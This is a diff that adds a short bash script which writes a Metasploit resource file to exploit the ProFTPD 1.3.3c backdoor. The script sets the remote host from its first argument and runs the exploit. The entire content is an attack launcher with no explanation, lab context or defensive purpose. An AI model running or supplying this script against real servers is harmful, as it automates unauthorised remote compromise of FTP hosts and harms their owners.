@@ -1,0 +1,6 @@
+#!/usr/bin/bash
+echo """
+use exploit/unix/ftp/proftpd_133c_backdoor
+set RHOST $1
+exploit
+""" >> bdoorftpd.rc
